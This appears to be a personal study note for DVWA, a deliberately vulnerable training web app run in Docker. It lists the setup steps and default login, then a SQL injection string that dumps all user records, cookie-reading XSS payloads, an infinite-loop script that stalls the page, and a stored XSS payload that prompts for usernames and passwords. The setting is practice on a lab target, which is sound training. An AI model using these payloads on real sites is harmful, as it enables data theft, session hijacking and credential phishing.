# Web Security

To run DVWA easily:
1. Install docker
2. Run docker
3. Enter the following command

```docker run --rm -it -p 80:80 vulnerables/web-dvwa```

4. Go to `localhost:80' (firefox is better than chrome since chrome as anti-xss stuff)
5. Enter `admin` and `password`
6. Scroll down and click create and reset database
7. Log back in using the same credentials


SQL Injection:
Displays all records in DB:

Query being run by the server:

```SELECT first_name, last_name FROM users WHERE user_id = '$id'```
\
\
\
\
\
\
\
\
\
\
Substitute the following in:
```%' or '0'='0```

DOM XSS:

```?default=<script>alert(document.cookie)</script>```

Onetime XSS:

```<script>alert(document.cookie)</script>```

Stall/Crash server:
```<script>for(;;){}</script>```

Stored XSS:

Enter the following:

```
So happy to be here
<script>
  alert("Hi, we need you to login once more before you can sign the book");
  var user = prompt("Please enter your username");
  var pwd = prompt("Please enter your password");
</script>
```


